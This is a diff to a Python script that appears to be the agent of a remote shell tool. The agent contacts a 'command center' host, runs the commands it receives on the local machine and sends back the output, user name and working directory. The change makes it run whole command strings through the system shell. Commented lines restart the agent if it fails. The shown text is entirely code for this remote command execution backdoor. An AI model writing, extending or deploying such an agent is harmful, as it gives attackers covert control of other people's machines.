@@ -2,7 +2,7 @@
 import getpass
 import os
 import sys
-from subprocess import check_output as execute
+from subprocess import getoutput as execute
 from time import sleep
 
 import urllib3
@@ -44,8 +44,7 @@ def send_command_output_to_server(session, shell_uuid, body_message, url):
             print(resp.text)
     except Exception as e:
         print('[{uuid}] Unexpected error: {error}'.format(error=e, uuid=shell_uuid))
-
-
+from subprocess import STDOUT as stdout
 def execute_command(command, current_work_dir=None):
     try:
         command_as_array = command.split(' ')
@@ -55,12 +54,14 @@ def execute_command(command, current_work_dir=None):
         else:
             if current_work_dir:
                 os.chdir(current_work_dir)
-            result = execute(command_as_array)
+            result = execute(command)
     except Exception as e:
         result = str(e)
     encoding = sys.getdefaultencoding()
     user = getpass.getuser()
     current_work_dir = os.getcwd()
+    if type(result) == bytes:
+        result = result.decode(encoding, 'ignore')
     return {
         "user": user,
         "pwd": current_work_dir,
@@ -151,3 +152,4 @@ communicate_with_command_center(options)
 # except:
 #     # try to restart the agent in case of any error
 #     Popen([sys.argv[0], "--hostname", options.hostname])
+
